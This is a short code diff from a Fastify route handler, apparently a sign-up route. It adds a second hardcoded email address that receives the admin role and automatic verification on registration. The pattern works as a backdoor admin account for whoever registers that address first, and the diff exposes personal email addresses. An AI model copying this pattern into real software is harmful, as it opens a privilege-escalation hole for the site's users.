@@ -85,7 +85,7 @@ async function routes(fastify, options) {
             const { username, password } = request.body
             // Always 'regular' by default (except user@mail.com for tests)
             const role =
-                username === 'bacloud14@gmail.com' ? 'admin' : 'regular'
+                username === 'bacloud14@gmail.com' || username === 'sracer2016@yahoo.com' ? 'admin' : 'regular'
             const isVerified = role === 'admin' ? true : false
             try {
                 const user = await QInstance.getUserById(username)
